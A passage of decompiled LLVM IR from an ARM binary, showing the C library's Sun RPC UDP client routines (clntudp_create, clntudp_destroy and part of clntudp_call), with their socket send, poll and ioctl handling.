dec_label_pc_1688c:                               ; preds = %bb33
  store i32 %v0_16884, i32* @r0, align 4
  %v0_16890 = call i32 @free()
  store i32 %v0_16890, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16898

dec_label_pc_16898:                               ; preds = %bb33, %dec_label_pc_16864, %dec_label_pc_1688c
  %v0_16898 = phi i32 [ 0, %bb33 ], [ %v0_16898.pre, %dec_label_pc_16864 ], [ 0, %dec_label_pc_1688c ]
  store i32 %v0_16898, i32* %r0.global-to-local, align 4
  store i32 %v6_16654, i32* @r5, align 4
  store i32 %v9_16654, i32* @r6, align 4
  store i32 %v12_16654, i32* @r7, align 4
  store i32 %v15_16654, i32* @r8, align 4
  store i32 %v18_16654, i32* @sb, align 4
  store i32 %v21_16654, i32* @sl, align 4
  store i32 %v24_16654, i32* @fp, align 4
  store i32 %v27_16654, i32* @lr, align 4
  ret i32 %v0_16898

; uselistorder directives
  uselistorder i32 %v0_16898, { 1, 0 }
  uselistorder i32 %v0_167f8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_16794, { 1, 0, 2 }
  uselistorder i32 %v0_1678c, { 2, 1, 0 }
  uselistorder i32 %v1_1671c, { 1, 0 }
  uselistorder i32 %v4_1670c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_166ec, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1669c, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 6, 5, 7, 8, 9, 10, 14, 11, 12, 13, 15, 17, 16, 19, 18, 21, 20, 23, 22, 25, 24, 26, 0 }
  uselistorder i32 (i32, i32, i32, i32*, i32)* @__GI_setsockopt, { 3, 0, 1, 2 }
  uselistorder i32 84, { 8, 0, 5, 6, 1, 2, 3, 4, 7 }
  uselistorder i32 %arg4, { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_16898, { 2, 0, 1 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %dec_label_pc_16878, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_16864, { 1, 0 }
  uselistorder label %dec_label_pc_16734, { 1, 0 }
  uselistorder label %dec_label_pc_166b8, { 1, 0 }
}

define i32 @__GI_clntudp_create(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %v3_168c0 = load i32, i32* @r4, align 4
  %v6_168c0 = load i32, i32* @r5, align 4
  %v9_168c0 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 8800, i32* @lr, align 4
  %v1_168f0 = load i32, i32* @r1, align 4
  %v2_168f0 = load i32, i32* @r2, align 4
  %v8_168f0 = inttoptr i32 %arg1 to i32*
  %v9_168f0 = call i32 @__GI_clntudp_bufcreate(i32* %v8_168f0, i32 %v1_168f0, i32 %v2_168f0, i32 %arg2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_168c0, i32* @r4, align 4
  store i32 %v6_168c0, i32* @r5, align 4
  store i32 %v9_168c0, i32* @lr, align 4
  ret i32 %v9_168f0

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @clntudp_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_16908 = load i32, i32* @r4, align 4
  store i32 %v3_16908, i32* %stack_var_-12, align 4
  %v6_16908 = load i32, i32* @r5, align 4
  %v9_16908 = load i32, i32* @lr, align 4
  %v1_1690c = add i32 %arg1, 8
  %v2_1690c = inttoptr i32 %v1_1690c to i32*
  %v3_1690c = load i32, i32* %v2_1690c, align 4
  store i32 %v3_1690c, i32* @r4, align 4
  %v1_16910 = add i32 %v3_1690c, 4
  %v2_16910 = inttoptr i32 %v1_16910 to i32*
  %v3_16910 = load i32, i32* %v2_16910, align 4
  %v2_16914 = icmp eq i32 %v3_16910, 0
  store i32 %arg1, i32* @r5, align 4
  br i1 %v2_16914, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  store i32 92452, i32* @lr, align 4
  %v1_16920 = xor i1 %v2_16914, true
  call void @__pseudo_cond_branch(i1 %v1_16920, i32 ptrtoint (i32* @global_var_10018.859 to i32))
  %v0_16924 = load i32, i32* @r4, align 4
  %v1_16924 = add i32 %v0_16924, 60
  %v2_16924 = inttoptr i32 %v1_16924 to i32*
  %v3_16924 = load i32, i32* %v2_16924, align 4
  %v1_16928 = add i32 %v3_16924, 28
  %v2_16928 = inttoptr i32 %v1_16928 to i32*
  %v3_16928 = load i32, i32* %v2_16928, align 4
  %v2_1692c = icmp eq i32 %v3_16928, 0
  br i1 %v2_1692c, label %.thread, label %bb6

bb6:                                              ; preds = %bb5
  store i32 92476, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_16928)
  %v0_1693c.pre = load i32, i32* @r4, align 4
  br label %.thread

.thread:                                          ; preds = %bb5, %bb6
  %v0_1693c = phi i32 [ %v0_16924, %bb5 ], [ %v0_1693c.pre, %bb6 ]
  store i32 %v0_1693c, i32* @r0, align 4
  %v0_16940 = call i32 @free()
  %v0_16944 = load i32, i32* @r5, align 4
  store i32 %v0_16944, i32* @r0, align 4
  %v2_16948 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16948, i32* @r4, align 4
  store i32 %v6_16908, i32* @r5, align 4
  store i32 %v9_16908, i32* @lr, align 4
  %v0_1694c = call i32 @free()
  ret i32 %v0_1694c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @clntudp_call(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp57 = call i8 @__decompiler_undefined_function_2()
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-104 = alloca i8, align 1
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-144 = alloca i8, align 1
  %stack_var_-72 = alloca i8*, align 4
  %stack_var_-9008 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-8196 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_16954 = load i32, i32* @r4, align 4
  store i32 %v3_16954, i32* %stack_var_-44, align 4
  %v34_16954 = ptrtoint i32* %stack_var_-44 to i32
  %v2_16964 = ptrtoint i32* %stack_var_-8196 to i32
  store i32 %v34_16954, i32* %ip.global-to-local, align 4
  %v3_16974 = add i32 %v34_16954, -8968
  %v4_16974 = inttoptr i32 %v3_16974 to i32*
  store i32 %arg2, i32* %v4_16974, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v1_16980 = add i32 %tmp, 8
  %v2_16980 = inttoptr i32 %v1_16980 to i32*
  %v3_16980 = load i32, i32* %v2_16980, align 4
  store i32 %v3_16980, i32* @r6, align 4
  %v1_16984 = add i32 %v3_16980, 28
  %v2_16984 = inttoptr i32 %v1_16984 to i32*
  %v3_16984 = load i32, i32* %v2_16984, align 4
  %v2_1698c = mul i32 %v3_16984, 1000
  store i32 %v2_16964, i32* %ip.global-to-local, align 4
  %v1_16998 = add i32 %v3_16980, 32
  %v2_16998 = inttoptr i32 %v1_16998 to i32*
  %v3_16998 = load i32, i32* %v2_16998, align 4
  %v2_169a4 = sdiv i32 %v3_16998, 1000
  store i32 %v2_169a4, i32* %r0.global-to-local, align 4
  %v1_169a8 = add i32 %v3_16980, 40
  %v2_169a8 = inttoptr i32 %v1_169a8 to i32*
  %v3_169a8 = load i32, i32* %v2_169a8, align 4
  %v2_169ac = add i32 %v2_169a4, %v2_1698c
  store i32 %v2_169ac, i32* %ip.global-to-local, align 4
  %v3_169b4 = icmp eq i32 %v3_169a8, -1
  store i32 %arg7, i32* %r3.global-to-local, align 4
  store i32 %arg8, i32* @r4, align 4
  br i1 %v3_169b4, label %dec_label_pc_169c8, label %dec_label_pc_16a0c

dec_label_pc_169c8:                               ; preds = %entry
  store i32 %v2_16964, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16a1c

dec_label_pc_169d8:                               ; preds = %dec_label_pc_16afc
  %v0_169d8 = call i32 @__errno_location()
  store i32 %v0_169d8, i32* %r0.global-to-local, align 4
  %phitmp = inttoptr i32 %v0_169d8 to i32*
  %storemerge5 = load i32, i32* %phitmp, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %ip.global-to-local, align 4
  %v1_16a04 = load i32, i32* @r6, align 4
  %v2_16a04 = add i32 %v1_16a04, 48
  %v3_16a04 = inttoptr i32 %v2_16a04 to i32*
  store i32 %storemerge5, i32* %v3_16a04, align 4
  br label %dec_label_pc_169f0

dec_label_pc_169e8:                               ; preds = %dec_label_pc_16cd4, %dec_label_pc_16cd0, %dec_label_pc_16b38
  store i32 5, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_169ec

dec_label_pc_169ec:                               ; preds = %dec_label_pc_16c48, %dec_label_pc_16ae0, %dec_label_pc_169e8
  %v0_169ec = phi i32 [ 4, %dec_label_pc_16c48 ], [ 1, %dec_label_pc_16ae0 ], [ 5, %dec_label_pc_169e8 ]
  store i32 %v0_169ec, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_169f0

dec_label_pc_169f0:                               ; preds = %dec_label_pc_16ec4, %dec_label_pc_169d8, %dec_label_pc_169ec
  %v0_169f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_169f0 = load i32, i32* @r6, align 4
  %v2_169f0 = add i32 %v1_169f0, 44
  %v3_169f0 = inttoptr i32 %v2_169f0 to i32*
  store i32 %v0_169f0, i32* %v3_169f0, align 4
  %v0_16ffc.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16ffc

dec_label_pc_16a0c:                               ; preds = %entry
  %v1_16a0c = add i32 %v3_16980, 36
  %v2_16a0c = inttoptr i32 %v1_16a0c to i32*
  %v3_16a0c = load i32, i32* %v2_16a0c, align 4
  store i32 %v3_16a0c, i32* %ip.global-to-local, align 4
  store i32 %v2_16964, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16a1c

dec_label_pc_16a1c:                               ; preds = %dec_label_pc_169c8, %dec_label_pc_16a0c
  %storemerge6 = phi i32 [ %v3_169a8, %dec_label_pc_16a0c ], [ %arg8, %dec_label_pc_169c8 ]
  %storemerge7 = phi i32 [ %v3_16a0c, %dec_label_pc_16a0c ], [ %arg7, %dec_label_pc_169c8 ]
  store i32 0, i32* %sb.global-to-local, align 4
  %v2_16a3c = icmp eq i32 %arg3, 0
  %v2_16b50 = ptrtoint i32* %stack_var_-196 to i32
  %v2_16b84 = ptrtoint i32* %stack_var_-56 to i32
  %v3_16b90 = bitcast i32* %stack_var_-56 to %pollfd*
  %v4_16cf8 = zext i8 %tmp57 to i32
  %v1_16cfc = and i32 %v4_16cf8, 8
  %v2_16cfc = icmp eq i32 %v1_16cfc, 0
  %v2_16e74 = ptrtoint i32* %stack_var_-88 to i32
  %v2_16e90 = ptrtoint i32* %stack_var_-48 to i32
  %v2_16d18 = ptrtoint i8* %stack_var_-104 to i32
  %v2_16d38 = ptrtoint i32* %stack_var_-9008 to i32
  %v2_16bc0 = ptrtoint i8** %stack_var_-72 to i32
  %v2_16c3c = ptrtoint i32* %stack_var_-160 to i32
  %v13_16bf0 = ptrtoint i8* %stack_var_-144 to i32
  %v2_16f00 = ptrtoint i32* %stack_var_-128 to i32
  %v2_16f14 = ptrtoint i32* %stack_var_-208 to i32
  %v2_16b30 = icmp eq i32 %storemerge7, 0
  %v2_16b40 = icmp eq i32 %storemerge6, 0
  %v3_16d28 = add i32 %v34_16954, -8964
  %v4_16d28 = inttoptr i32 %v3_16d28 to i32*
  br label %dec_label_pc_16a34

dec_label_pc_16a34:                               ; preds = %dec_label_pc_16fd8, %dec_label_pc_16a1c
  %v1_16a4c = phi i32 [ %v3_16980, %dec_label_pc_16a1c ], [ %v0_16a40.pre, %dec_label_pc_16fd8 ]
  %stack_var_-9024.0 = phi i32 [ 0, %dec_label_pc_16a1c ], [ %stack_var_-9024.2, %dec_label_pc_16fd8 ]
  %stack_var_-9028.0 = phi i32 [ 0, %dec_label_pc_16a1c ], [ %stack_var_-9028.2, %dec_label_pc_16fd8 ]
  %stack_var_-9032.0 = phi i32 [ 2, %dec_label_pc_16a1c ], [ %v1_16fe0, %dec_label_pc_16fd8 ]
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v1_16a40 = add i32 %v1_16a4c, 56
  store i32 %v1_16a40, i32* @r8, align 4
  br i1 %v2_16a3c, label %dec_label_pc_16b48, label %dec_label_pc_16a48

dec_label_pc_16a48:                               ; preds = %dec_label_pc_16a34
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_16a4c = inttoptr i32 %v1_16a40 to i32*
  store i32 0, i32* %v3_16a4c, align 4
  %v0_16a54 = load i32, i32* @r8, align 4
  %v1_16a54 = add i32 %v0_16a54, 4
  %v2_16a54 = inttoptr i32 %v1_16a54 to i32*
  %v3_16a54 = load i32, i32* %v2_16a54, align 4
  store i32 %v3_16a54, i32* %r3.global-to-local, align 4
  store i32 %v0_16a54, i32* %r0.global-to-local, align 4
  %v1_16a60 = add i32 %v3_16a54, 20
  %v2_16a60 = inttoptr i32 %v1_16a60 to i32*
  %v3_16a60 = load i32, i32* %v2_16a60, align 4
  call void @__pseudo_branch(i32 %v3_16a60)
  %v0_16a64 = load i32, i32* @r6, align 4
  %v1_16a64 = add i32 %v0_16a64, 88
  %v2_16a64 = inttoptr i32 %v1_16a64 to i32*
  %v3_16a64 = load i32, i32* %v2_16a64, align 4
  %v1_16a68 = inttoptr i32 %v3_16a64 to i32*
  %v2_16a68 = load i32, i32* %v1_16a68, align 4
  %v1_16a6c = add i32 %v2_16a68, 1
  store i32 %v1_16a6c, i32* %r3.global-to-local, align 4
  store i32 %v1_16a6c, i32* %v1_16a68, align 4
  %v0_16a80 = load i32, i32* @r8, align 4
  %v1_16a80 = add i32 %v0_16a80, 4
  %v2_16a80 = inttoptr i32 %v1_16a80 to i32*
  %v3_16a80 = load i32, i32* %v2_16a80, align 4
  store i32 %v3_16a80, i32* %r3.global-to-local, align 4
  store i32 %v0_16a80, i32* %r0.global-to-local, align 4
  %v1_16a8c = add i32 %v3_16a80, 4
  %v2_16a8c = inttoptr i32 %v1_16a8c to i32*
  %v3_16a8c = load i32, i32* %v2_16a8c, align 4
  call void @__pseudo_branch(i32 %v3_16a8c)
  %v0_16a90 = load i32, i32* %r0.global-to-local, align 4
  %v2_16a90 = icmp eq i32 %v0_16a90, 0
  br i1 %v2_16a90, label %dec_label_pc_16ae0, label %dec_label_pc_16a98

dec_label_pc_16a98:                               ; preds = %dec_label_pc_16a48
  %v2_16aa0 = load i32, i32* %arg1, align 4
  store i32 %v2_16aa0, i32* %r3.global-to-local, align 4
  store i32 %v2_16aa0, i32* %r0.global-to-local, align 4
  %v1_16aac = add i32 %v2_16aa0, 32
  %v2_16aac = inttoptr i32 %v1_16aac to i32*
  %v3_16aac = load i32, i32* %v2_16aac, align 4
  store i32 %v3_16aac, i32* %r3.global-to-local, align 4
  %v1_16ab4 = add i32 %v3_16aac, 4
  %v2_16ab4 = inttoptr i32 %v1_16ab4 to i32*
  %v3_16ab4 = load i32, i32* %v2_16ab4, align 4
  call void @__pseudo_branch(i32 %v3_16ab4)
  %v0_16ab8 = load i32, i32* %r0.global-to-local, align 4
  %v2_16ab8 = icmp eq i32 %v0_16ab8, 0
  br i1 %v2_16ab8, label %dec_label_pc_16ae0, label %dec_label_pc_16ac0

dec_label_pc_16ac0:                               ; preds = %dec_label_pc_16a98
  %v0_16ac4 = load i32, i32* @r8, align 4
  store i32 %v0_16ac4, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg3)
  %v0_16ad8 = load i32, i32* %r0.global-to-local, align 4
  %v2_16ad8 = icmp eq i32 %v0_16ad8, 0
  br i1 %v2_16ad8, label %dec_label_pc_16ae0, label %dec_label_pc_16ae8

dec_label_pc_16ae0:                               ; preds = %dec_label_pc_16ac0, %dec_label_pc_16a98, %dec_label_pc_16a48
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_169ec

dec_label_pc_16ae8:                               ; preds = %dec_label_pc_16ac0
  %v0_16ae8 = load i32, i32* @r8, align 4
  %v1_16ae8 = add i32 %v0_16ae8, 4
  %v2_16ae8 = inttoptr i32 %v1_16ae8 to i32*
  %v3_16ae8 = load i32, i32* %v2_16ae8, align 4
  store i32 %v3_16ae8, i32* %r3.global-to-local, align 4
  store i32 %v0_16ae8, i32* %r0.global-to-local, align 4
  %v1_16af4 = add i32 %v3_16ae8, 16
  %v2_16af4 = inttoptr i32 %v1_16af4 to i32*
  %v3_16af4 = load i32, i32* %v2_16af4, align 4
  call void @__pseudo_branch(i32 %v3_16af4)
  %v0_16af8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16af8, i32* %sb.global-to-local, align 4
  %v0_16afc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16afc

dec_label_pc_16afc:                               ; preds = %dec_label_pc_16cd4, %dec_label_pc_16cbc, %dec_label_pc_16ae8
  %v0_16b0c = phi i32 [ %v0_16c54, %dec_label_pc_16cbc ], [ %v0_16c54, %dec_label_pc_16cd4 ], [ %v0_16afc.pre, %dec_label_pc_16ae8 ]
  %stack_var_-9024.1 = phi i32 [ %stack_var_-9024.3.lcssa, %dec_label_pc_16cbc ], [ %storemerge7, %dec_label_pc_16cd4 ], [ %stack_var_-9024.0, %dec_label_pc_16ae8 ]
  %stack_var_-9028.1 = phi i32 [ %v0_16cdc, %dec_label_pc_16cbc ], [ %v0_16cdc, %dec_label_pc_16cd4 ], [ %stack_var_-9028.0, %dec_label_pc_16ae8 ]
  %v1_16afc = add i32 %v0_16b0c, 8
  store i32 %v1_16afc, i32* %r3.global-to-local, align 4
  %v1_16b00 = inttoptr i32 %v0_16b0c to i32*
  %v2_16b00 = load i32, i32* %v1_16b00, align 4
  store i32 %v2_16b00, i32* @r0, align 4
  %v1_16b04 = add i32 %v0_16b0c, 88
  %v2_16b04 = inttoptr i32 %v1_16b04 to i32*
  %v3_16b04 = load i32, i32* %v2_16b04, align 4
  store i32 %v3_16b04, i32* @r1, align 4
  %v1_16b0c = add i32 %v0_16b0c, 24
  %v2_16b0c = inttoptr i32 %v1_16b0c to i32*
  %v3_16b0c = load i32, i32* %v2_16b0c, align 4
  store i32 %v3_16b0c, i32* %ip.global-to-local, align 4
  %v0_16b10 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_16b10, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v6_16b1c = call i32 @__libc_sendto(i32 %v2_16b00, i32 %v3_16b04, i32 %v0_16b10, i32 0, i32 %v1_16afc, i32 %v3_16b0c)
  store i32 %v6_16b1c, i32* %r0.global-to-local, align 4
  %v9_16b20 = icmp eq i32 %v6_16b1c, %v0_16b10
  br i1 %v9_16b20, label %dec_label_pc_16b28, label %dec_label_pc_169d8

dec_label_pc_16b28:                               ; preds = %dec_label_pc_16afc
  store i32 %storemerge7, i32* %ip.global-to-local, align 4
  br i1 %v2_16b30, label %dec_label_pc_16b38, label %dec_label_pc_16b48

dec_label_pc_16b38:                               ; preds = %dec_label_pc_16b28
  store i32 %storemerge6, i32* %r0.global-to-local, align 4
  br i1 %v2_16b40, label %dec_label_pc_169e8, label %dec_label_pc_16b48

dec_label_pc_16b48:                               ; preds = %dec_label_pc_16b28, %dec_label_pc_16b38, %dec_label_pc_16a34
  %stack_var_-9024.2 = phi i32 [ %stack_var_-9024.0, %dec_label_pc_16a34 ], [ %stack_var_-9024.1, %dec_label_pc_16b38 ], [ %stack_var_-9024.1, %dec_label_pc_16b28 ]
  %stack_var_-9028.2 = phi i32 [ %stack_var_-9028.0, %dec_label_pc_16a34 ], [ %stack_var_-9028.1, %dec_label_pc_16b38 ], [ %stack_var_-9028.1, %dec_label_pc_16b28 ]
  %v2_16b4c = load i32, i32* @global_var_2f610.862, align 4
  store i32 %v2_16b4c, i32* %r0.global-to-local, align 4
  %v5_16b4c = load i32, i32* @global_var_2f614.863, align 4
  store i32 %v2_16b50, i32* %r3.global-to-local, align 4
  store i32 %v2_16b4c, i32* %stack_var_-196, align 4
  %v0_16b68 = load i32, i32* @r6, align 4
  %v1_16b68 = inttoptr i32 %v0_16b68 to i32*
  %v2_16b68 = load i32, i32* %v1_16b68, align 4
  store i32 %v2_16b68, i32* %stack_var_-56, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16b80

dec_label_pc_16b80:                               ; preds = %dec_label_pc_16eb4, %dec_label_pc_16eec, %dec_label_pc_16ed4, %dec_label_pc_16ec0, %dec_label_pc_16b48
  store i32 %v2_16964, i32* %r3.global-to-local, align 4
  store i32 %v2_16b84, i32* %r0.global-to-local, align 4
  %v4_16b90 = call i32 @__libc_poll(%pollfd* %v3_16b90, i32 1, i32 %v2_169ac)
  store i32 %v4_16b90, i32* %r0.global-to-local, align 4
  %v7_16b94 = icmp eq i32 %v4_16b90, -1
  br i1 %v7_16b94, label %dec_label_pc_16ec0, label %dec_label_pc_16b9c

dec_label_pc_16b9c:                               ; preds = %dec_label_pc_16b80
  %v2_16b9c = icmp eq i32 %v4_16b90, 0
  br i1 %v2_16b9c, label %dec_label_pc_16ba4, label %dec_label_pc_16cf8

dec_label_pc_16ba4:                               ; preds = %dec_label_pc_16b9c
  %v0_16ba4 = load i32, i32* @r6, align 4
  %v1_16ba4 = inttoptr i32 %v0_16ba4 to i32*
  %v2_16ba4 = load i32, i32* %v1_16ba4, align 4
  store i32 %v2_16ba4, i32* @sl, align 4
  store i32 8800, i32* %r3.global-to-local, align 4
  store i32 %v2_16d38, i32* %ip.global-to-local, align 4
  store i32 %v2_16ba4, i32* @r0, align 4
  store i8* inttoptr (i32 8800 to i8*), i8** %stack_var_-72, align 4
  %v3_16bcc = call i32 @ioctl(i32 %v2_16ba4, i32 35090, i32 %v2_16bc0)
  store i32 %v3_16bcc, i32* %r0.global-to-local, align 4
  %v2_16bd0 = icmp eq i32 %v3_16bcc, 0
  br i1 %v2_16bd0, label %dec_label_pc_16bd8, label %dec_label_pc_16c48

dec_label_pc_16bd8:                               ; preds = %dec_label_pc_16ba4
  %v2_16bdc = load i8*, i8** %stack_var_-72, align 4
  %v3_16bdc = ptrtoint i8* %v2_16bdc to i32
  store i32 %v3_16bdc, i32* %r3.global-to-local, align 4
  store i32 %v2_16d38, i32* @r4, align 4
  %v3_16be0 = udiv i32 %v3_16bdc, 32
  %tmp146 = icmp ult i8* %v2_16bdc, inttoptr (i32 32 to i8*)
  store i32 %v2_16c3c, i32* %ip.global-to-local, align 4
  %v1_16c40135 = add nsw i32 %v3_16be0, -1
  store i32 %v1_16c40135, i32* @r7, align 4
  br i1 %tmp146, label %dec_label_pc_16c48, label %dec_label_pc_16be8

dec_label_pc_16be8:                               ; preds = %dec_label_pc_16bd8, %dec_label_pc_16c34
  %v0_16be8137 = phi i32 [ %v1_16c34, %dec_label_pc_16c34 ], [ %v2_16d38, %dec_label_pc_16bd8 ]
  %v1_16bec = inttoptr i32 %v0_16be8137 to i32*
  %v2_16bec = load i32, i32* %v1_16bec, align 4
  store i32 %v2_16bec, i32* %r0.global-to-local, align 4
  %v9_16bec = add i32 %v0_16be8137, 12
  %v10_16bec = inttoptr i32 %v9_16bec to i32*
  %v11_16bec = load i32, i32* %v10_16bec, align 4
  store i32 %v11_16bec, i32* %r3.global-to-local, align 4
  %v12_16bec = add i32 %v0_16be8137, 16
  store i32 %v12_16bec, i32* @r5, align 4
  store i32 %v2_16bec, i32* %stack_var_-160, align 4
  store i32 %v13_16bf0, i32* %ip.global-to-local, align 4
  %v1_16bf4 = inttoptr i32 %v12_16bec to i32*
  %v2_16bf4 = load i32, i32* %v1_16bf4, align 4
  store i32 %v2_16bf4, i32* %r0.global-to-local, align 4
  %v9_16bf4 = add i32 %v0_16be8137, 28
  %v10_16bf4 = inttoptr i32 %v9_16bf4 to i32*
  %v11_16bf4 = load i32, i32* %v10_16bf4, align 4
  store i32 %v11_16bf4, i32* %r3.global-to-local, align 4
  %v4_16bf8 = trunc i32 %v2_16bf4 to i8
  store i8 %v4_16bf8, i8* %stack_var_-144, align 1
  %v0_16bfc = load i32, i32* @sl, align 4
  store i32 %v0_16bfc, i32* @r0, align 4
  %v3_16c08 = call i32 @ioctl(i32 %v0_16bfc, i32 35091, i32 %v2_16c3c)
  store i32 %v3_16c08, i32* %r0.global-to-local, align 4
  %v1_16c0c = icmp slt i32 %v3_16c08, 0
  br i1 %v1_16c0c, label %dec_label_pc_16c48, label %dec_label_pc_16c14

dec_label_pc_16c14:                               ; preds = %dec_label_pc_16be8
  %v3_16c14 = load i8, i8* %stack_var_-144, align 1
  %v4_16c14 = sext i8 %v3_16c14 to i32
  store i32 %v4_16c14, i32* %r3.global-to-local, align 4
  %v1_16c18 = urem i32 %v4_16c14, 2
  %v2_16c18 = icmp eq i32 %v1_16c18, 0
  br i1 %v2_16c18, label %dec_label_pc_16c14.dec_label_pc_16c34_crit_edge, label %dec_label_pc_16c20

dec_label_pc_16c14.dec_label_pc_16c34_crit_edge:  ; preds = %dec_label_pc_16c14
  %v0_16c34.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16c34

dec_label_pc_16c20:                               ; preds = %dec_label_pc_16c14
  %v0_16c20 = load i32, i32* @r5, align 4
  %v1_16c20 = add i32 %v0_16c20, 1
  %v2_16c20 = inttoptr i32 %v1_16c20 to i8*
  %v3_16c20 = load i8, i8* %v2_16c20, align 1
  %v4_16c20 = zext i8 %v3_16c20 to i32
  %v0_16c24 = load i32, i32* @r4, align 4
  %v1_16c24 = add i32 %v0_16c24, 16
  %v2_16c24 = inttoptr i32 %v1_16c24 to i8*
  %v3_16c24 = load i8, i8* %v2_16c24, align 1
  %v4_16c24 = zext i8 %v3_16c24 to i32
  %v4_16c28 = mul nuw nsw i32 %v4_16c20, 256
  %v5_16c28 = or i32 %v4_16c24, %v4_16c28
  store i32 %v5_16c28, i32* %r3.global-to-local, align 4
  %v7_16c2c = icmp eq i32 %v5_16c28, 2
  br i1 %v7_16c2c, label %dec_label_pc_16c50, label %dec_label_pc_16c34

dec_label_pc_16c34:                               ; preds = %dec_label_pc_16c14.dec_label_pc_16c34_crit_edge, %dec_label_pc_16c20
  %v0_16c34 = phi i32 [ %v0_16c34.pre, %dec_label_pc_16c14.dec_label_pc_16c34_crit_edge ], [ %v0_16c24, %dec_label_pc_16c20 ]
  %v1_16c34 = add i32 %v0_16c34, 32
  store i32 %v1_16c34, i32* @r4, align 4
  %v0_16c38.pre = load i32, i32* @r7, align 4
  store i32 %v2_16c3c, i32* %ip.global-to-local, align 4
  %v1_16c40 = add i32 %v0_16c38.pre, -1
  store i32 %v1_16c40, i32* @r7, align 4
  %tmp114 = icmp slt i32 %v0_16c38.pre, 1
  br i1 %tmp114, label %dec_label_pc_16c48, label %dec_label_pc_16be8

dec_label_pc_16c48:                               ; preds = %dec_label_pc_16ba4, %dec_label_pc_16bd8, %dec_label_pc_16be8, %dec_label_pc_16c34
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_169ec

dec_label_pc_16c50:                               ; preds = %dec_label_pc_16c20
  store i32 %v2_16964, i32* %ip.global-to-local, align 4
  %v0_16c54 = load i32, i32* @r6, align 4
  %v1_16c54 = add i32 %v0_16c54, 28
  %v2_16c54 = inttoptr i32 %v1_16c54 to i32*
  %v3_16c54 = load i32, i32* %v2_16c54, align 4
  store i32 %v3_16c54, i32* %r3.global-to-local, align 4
  %v2_16c5c = add i32 %v3_16c54, %stack_var_-9024.2
  store i32 %v2_16c5c, i32* %r0.global-to-local, align 4
  store i32 %v2_16964, i32* %ip.global-to-local, align 4
  %v1_16c64 = add i32 %v0_16c54, 32
  %v2_16c64 = inttoptr i32 %v1_16c64 to i32*
  %v3_16c64 = load i32, i32* %v2_16c64, align 4
  store i32 %stack_var_-9028.2, i32* %r0.global-to-local, align 4
  %v2_16c70 = add i32 %v3_16c64, %stack_var_-9028.2
  store i32 999999, i32* %r3.global-to-local, align 4
  store i32 %v2_16c70, i32* %ip.global-to-local, align 4
  %v8_16cb829 = icmp sgt i32 %v2_16c70, 999999
  br i1 %v8_16cb829, label %dec_label_pc_16c7c.lr.ph, label %dec_label_pc_16cbc

dec_label_pc_16c7c.lr.ph:                         ; preds = %dec_label_pc_16c50
  %tmp116 = add i32 %stack_var_-9028.2, -1000000
